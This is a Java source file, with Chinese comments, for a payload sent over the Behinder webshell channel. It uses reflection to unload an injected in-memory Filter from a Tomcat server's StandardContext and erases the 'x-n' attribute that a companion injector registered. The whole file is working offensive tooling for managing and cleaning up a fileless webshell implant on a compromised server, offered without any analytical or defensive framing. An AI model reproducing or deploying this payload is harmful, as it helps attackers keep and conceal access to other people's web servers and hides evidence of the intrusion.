// 内存马卸载载荷（behinder-java 通道）：从 StandardContext 移除动态 Filter 的三注册面
// （filterConfigs / filterDefs / filterMaps）。名字 n 为空时读引导器登记的 application
// 属性 "x-n"（jsp-mem-filter 注入时写入），并顺带清除该属性。
// 约束：默认包、全反射、单 class、零跨类引用。
public class WsmMemUnload {

	public static final String n = "WSMU-N0"; // Filter 名（空 = 读 x-n 属性）

	public boolean equals(Object ctx) {
		String out;
		try { out = go(ctx); }
		catch (Throwable e) { out = "!ERR " + e; }
		try { write(respOf(ctx), out); } catch (Throwable ignored) {}
		return true;
	}

	String go(Object ctx) throws Exception {
		Object req = reqOf(ctx);
		if (req == null) throw new Exception("no request context");
		Object facade = req.getClass().getMethod("getServletContext").invoke(req);
		// 门面两层私有字段解包：facade.context → ApplicationContext.context → StandardContext
		Object appCtx = field(facade, "context");
		Object sc = field(appCtx, "context");
		String name = n;
		if (name == null || name.length() == 0) {
			Object attr = facade.getClass().getMethod("getAttribute", String.class).invoke(facade, "x-n");
			if (attr == null) throw new Exception("未指定 Filter 名且无 x-n 登记属性");
			name = String.valueOf(attr);
		}
		Class<?> scCls = sc.getClass();
		int removed = 0;
		// ① filterConfigs（Map）：remove
		try {
			Object cfgs = field(sc, "filterConfigs");
			if (cfgs instanceof java.util.Map && ((java.util.Map) cfgs).remove(name) != null) removed++;
		} catch (Throwable ignored) {}
		// ② filterDefs（Map）：remove
		try {
			Object defs = field(sc, "filterDefs");
			if (defs instanceof java.util.Map && ((java.util.Map) defs).remove(name) != null) removed++;
		} catch (Throwable ignored) {}
		// ③ filterMaps（FilterMap[]）：重建数组剔除同名项
		try {
			Object maps = field(sc, "filterMaps");
			if (maps instanceof Object[]) {
				Object[] arr = (Object[]) maps;
				int keep = 0;
				for (Object m : arr) {
					Object fn = m.getClass().getMethod("getFilterName").invoke(m);
					if (!name.equals(fn)) keep++;
				}
				Object[] na = (Object[]) java.lang.reflect.Array.newInstance(arr.getClass().getComponentType(), keep);
				int i = 0;
				for (Object m : arr) {
					Object fn = m.getClass().getMethod("getFilterName").invoke(m);
					if (!name.equals(fn)) na[i++] = m;
				}
				java.lang.reflect.Field f = scCls.getDeclaredField("filterMaps");
				f.setAccessible(true);
				f.set(sc, na);
				removed++;
			}
		} catch (Throwable ignored) {}
		// 清登记属性
		try { facade.getClass().getMethod("removeAttribute", String.class).invoke(facade, "x-n"); } catch (Throwable ignored) {}
		if (removed == 0) throw new Exception("Filter '" + name + "' 未在任何注册面命中");
		return "UNLOADED " + name + " (" + removed + " faces)";
	}

	static Object field(Object target, String name) throws Exception {
		Class<?> c = target.getClass();
		while (c != null) {
			try {
				java.lang.reflect.Field f = c.getDeclaredField(name);
				f.setAccessible(true);
				return f.get(target);
			} catch (NoSuchFieldException e) { c = c.getSuperclass(); }
		}
		throw new Exception("field not found: " + name);
	}

	static Object reqOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) {
			Object[] a = (Object[]) ctx;
			return a.length > 0 ? a[0] : null;
		}
		try { return ctx.getClass().getMethod("getRequest").invoke(ctx); } catch (Throwable ignored) {}
		return ctx;
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) {
			Object[] a = (Object[]) ctx;
			return a.length > 1 ? a[1] : null;
		}
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
